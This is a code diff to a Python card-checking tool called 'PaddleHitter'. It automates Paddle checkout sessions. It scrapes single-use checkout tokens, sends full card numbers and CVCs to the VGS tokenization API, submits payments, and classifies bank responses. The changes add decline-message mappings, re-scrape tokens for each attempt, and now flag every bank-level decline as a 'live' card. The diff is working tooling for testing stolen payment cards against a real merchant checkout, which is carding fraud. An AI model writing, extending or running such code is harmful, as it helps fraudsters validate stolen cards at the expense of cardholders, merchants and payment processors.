@@ -102,6 +102,12 @@ class PaddleHitter:
         "restricted card": "restricted_card",
         "issuer unavailable": "issuer_unavailable",
         "unable to take payment": "card_declined",
+        "declined by your bank": "card_declined",
+        "do not honor": "do_not_honor",
+        "not permitted": "not_permitted",
+        "blocked": "card_blocked",
+        "lost card": "lost_stolen",
+        "stolen card": "lost_stolen",
     }
 
     def __init__(self, url: str, proxy_data: Optional[dict] = None):
@@ -131,6 +137,7 @@ class PaddleHitter:
             'transaction_id': None,
             'client_token': None,
             'checkout_id': None,
+            'vgs_jwt': None,
             'is_paddle': False,
         }
 
@@ -195,16 +202,22 @@ class PaddleHitter:
                         if total_amt:
                             cfg['currency'] = curr
                             cfg['amount'] = f"{curr} {float(total_amt):.2f}"
+                        
+                        # Extract VGS JWT from payment methods
+                        methods = init_json.get('payments', {}).get('methods_available', [])
+                        for m in methods:
+                            if m.get('tokenization_provider') == 'vgs':
+                                vgs_opts = m.get('vgs_options', {})
+                                cfg['vgs_jwt'] = vgs_opts.get('jwt')
+                                break
             except Exception:
                 pass
 
         return cfg
 
     async def _get_config(self, session: ChromeSession) -> dict:
-        if self._base_cfg is None:
-            self._base_cfg = await self._scrape(session)
-            return self._base_cfg.copy()
-        return self._base_cfg.copy()
+        # Always re-scrape — checkout_id/vgs_jwt are single-use session tokens
+        return await self._scrape(session)
 
     def _parse_response(self, text: str, status_code: int, result: dict) -> dict:
         """Parses Paddle checkout response for receipt confirmation or decline reason."""
@@ -244,7 +257,8 @@ class PaddleHitter:
                             break
                     result['decline_code'] = dec_code
                     result['error'] = detail
-                    result['is_live'] = dec_code in ('insufficient_funds', 'incorrect_cvc', 'restricted_card', 'issuer_unavailable', '3ds_required')
+                    # Any real bank-level response is live — bank decline means card is real
+                    result['is_live'] = True
                     return result
         except Exception:
             pass
@@ -332,7 +346,7 @@ class PaddleHitter:
                         "Correlation-ID": str(uuid.uuid4()),
                     }
 
-                    # Step A: Register / Update Customer Details
+                    # Step A: Register Customer — await body to confirm 201 before pay
                     url_cust = f"https://checkout-service.paddle.com/transaction-checkout/{che_id}/customer"
                     cust_payload = {
                         "data": {
@@ -347,12 +361,50 @@ class PaddleHitter:
                         }
                     }
                     try:
-                        async with sess.post(url_cust, json=cust_payload, headers=headers, timeout=8) as _:
-                            pass
+                        async with sess.post(url_cust, json=cust_payload, headers=headers, timeout=8) as r_c:
+                            _ = r_c.text()  # Read body to ensure full round-trip
                     except Exception:
                         pass
-                    
-                    # Step B: Submit Payment Method
+
+                    # Step B: Tokenize Card via VGS vault → get card_id
+                    card_id = None
+                    vgs_jwt = cfg.get('vgs_jwt')
+                    if vgs_jwt:
+                        try:
+                            vgs_hdr = {
+                                "Authorization": f"Bearer {vgs_jwt}",
+                                "Content-Type": "application/vnd.api+json",
+                                "Accept": "application/vnd.api+json",
+                                "User-Agent": UA,
+                                "Origin": "https://buy.paddle.com",
+                                "Referer": "https://buy.paddle.com/",
+                            }
+                            vgs_payload = {
+                                "data": {
+                                    "type": "cards",
+                                    "attributes": {
+                                        "pan": clean_card,
+                                        "cvc": str(card.get('cvv', '')),
+                                        "exp_month": exp_month_int,
+                                        "exp_year": exp_year_int % 100,  # 2-digit year
+                                        "cardholder": {"name": shopper['full_name']}
+                                    }
+                                }
+                            }
+                            async with sess.post("https://vgsapi.com/cards", json=vgs_payload, headers=vgs_hdr, timeout=10) as r_vgs:
+                                if r_vgs.status_code in (200, 201):
+                                    vgs_data = r_vgs.json()
+                                    card_id = vgs_data.get('data', {}).get('id')
+                        except Exception:
+                            pass
+
+                    if not card_id:
+                        result['response_time'] = round(time.time() - t0, 2)
+                        result['decline_code'] = 'tokenization_failed'
+                        result['error'] = 'VGS card tokenization failed'
+                        return result
+
+                    # Step C: Submit Payment with VGS card_id
                     url_pay = f"https://checkout-service.paddle.com/transaction-checkout/{che_id}/pay"
                     pay_payload = {
                         "data": {
@@ -378,10 +430,7 @@ class PaddleHitter:
                                             "time_zone_offset": 0
                                         })
                                     },
-                                    "psp_mock_card": {
-                                        "bin": clean_card[:8] if len(clean_card) >= 8 else clean_card.ljust(8, '0'),
-                                        "last4": clean_card[-4:]
-                                    }
+                                    "vgs_card": {"card_id": card_id}
                                 }
                             }
                         }
